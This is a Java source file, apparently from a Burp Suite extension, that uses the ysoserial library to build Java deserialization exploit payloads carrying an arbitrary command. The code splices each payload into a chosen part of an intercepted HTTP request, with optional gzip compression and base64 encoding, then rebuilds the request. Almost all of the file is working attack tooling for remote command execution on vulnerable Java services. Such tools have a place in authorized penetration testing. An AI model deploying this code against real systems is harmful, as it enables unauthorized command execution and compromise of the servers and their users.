package burp;


import com.google.common.primitives.Bytes;
import ysoserial.Serializer;
import ysoserial.payloads.ObjectPayload;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.zip.GZIPOutputStream;

public class Utilities {

    public static byte[] serializeRequest(byte[] message, byte[] selectedMessage, boolean isEncoded, boolean isGzCompressed, String command, IExtensionHelpers helpers, String payloadType) {

        int selectedOffset = 0;
        int endingOffset = 0;

        if (selectedMessage != null){
            selectedOffset = Bytes.indexOf(message, selectedMessage);
            endingOffset = selectedOffset + selectedMessage.length;

        } else if(ChildTab.selectedMessage != null) {

            if (ChildTab.isEncoded) {
                selectedOffset = Bytes.indexOf(message, Base64.getEncoder().encode(ChildTab.selectedMessage));
                endingOffset = selectedOffset + Base64.getEncoder().encode(ChildTab.selectedMessage).length;
            } else {
                selectedOffset = Bytes.indexOf(message, ChildTab.selectedMessage);
                endingOffset = selectedOffset + ChildTab.selectedMessage.length;
            }
        }

        if (ChildTab.selectedMessage != null || selectedMessage != null) {

            byte[] beginningArray = Arrays.copyOfRange(message, 0, selectedOffset);
            byte[] endingArray = Arrays.copyOfRange(message, endingOffset, message.length);

            byte[] exploitArray = getExploitPayload(payloadType, command);
            
            if (isGzCompressed) {
            	ChildTab.isGzCompressed = true;
            	try {
            		ByteArrayOutputStream gzOsBytes = new ByteArrayOutputStream();
            		GZIPOutputStream gzOs = new GZIPOutputStream(gzOsBytes);
            		gzOs.write(exploitArray);
            		gzOs.close();
            		exploitArray = gzOsBytes.toByteArray();
            	} catch (IOException ioe) {
            		System.err.println("Error while compressing payload");
                    ioe.printStackTrace();
            	}
            } else {
            	ChildTab.isGzCompressed = false;
            }

            ChildTab.selectedMessage = exploitArray;

            byte[] output;

            if (isEncoded) {
                ChildTab.isEncoded = true;
                byte[] base64EncodedExploit = Base64.getEncoder().encode(exploitArray);

                output = Bytes.concat(beginningArray, base64EncodedExploit, endingArray);
            } else {
                ChildTab.isEncoded = false;
                output = Bytes.concat(beginningArray, exploitArray, endingArray);
            }

            IRequestInfo iRequestInfo = helpers.analyzeRequest(output);

            int bodyOffset = iRequestInfo.getBodyOffset();

            java.util.List<String> headers = iRequestInfo.getHeaders();

            byte[] newBody = new byte[output.length - bodyOffset];

            System.arraycopy(output, bodyOffset, newBody, 0, output.length - bodyOffset);

            return helpers.buildHttpMessage(headers, newBody);
        } else {
             return message;
         }
    }

    private static byte[] getExploitPayload(String payloadType, String command){

        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(payloadType.split(" ")[0]);

        byte[] exploitPayload = new byte[0];

        try {
            final ObjectPayload payload = payloadClass.newInstance();
            final Object object = payload.getObject(command);
            exploitPayload = Serializer.serialize(object);
        } catch (Throwable e) {
            System.err.println("Error while generating or serializing payload");
            e.printStackTrace();
        }

        return exploitPayload;

    }

    public static String[] formatCommand(String command){
        List<String> list = new ArrayList<>();
        Matcher m = Pattern.compile("([^\']\\S*|\'.*?(.*).*?.+?\')\\s*").matcher(command);
        int first;
        int last;
        String firstFix;
        String lastFix;
        while (m.find()) {
            if(m.group(1).contains("\'")){
                first = m.group(1).indexOf('\'');
                firstFix = new StringBuilder(m.group(1)).replace(first,first+1,"").toString();
                last = firstFix.lastIndexOf('\'');
                lastFix = new StringBuilder(firstFix).replace(last,last+1,"").toString();
                list.add(lastFix);
            } else {
                list.add(m.group(1));
            }
        }

        return list.toArray(new String[list.size()]);
    }
}
